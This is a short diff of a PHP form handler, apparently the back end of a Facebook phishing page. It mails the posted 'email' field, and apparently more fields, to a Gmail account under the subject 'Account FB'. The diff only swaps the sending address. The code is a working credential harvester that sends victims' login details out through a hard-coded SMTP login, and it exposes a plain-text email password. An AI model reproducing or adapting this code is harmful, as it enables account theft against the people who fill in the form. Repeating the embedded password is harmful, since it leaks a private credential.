@@ -21,10 +21,10 @@ if($_POST){
         $mail->Host = "smtp.gmail.com";
         $mail->Port = 587; // or 587
         $mail->isHTML(true);  
-        $mail->Username = "huynguyen66028@gmail.com";
+        $mail->Username = "anphawolf@gmail.com";
         $mail->Password = "anphawolf@%)$1997";
       
-        $mail->SetFrom("huynguyen66028@gmail.com","Huy Nguyen");
+        $mail->SetFrom("anphawolf@gmail.com","Huy Nguyen");
         
         $mail->Subject = 'Account FB';
         $mail->Body = ' username: '.$_POST['email'] .' <br>
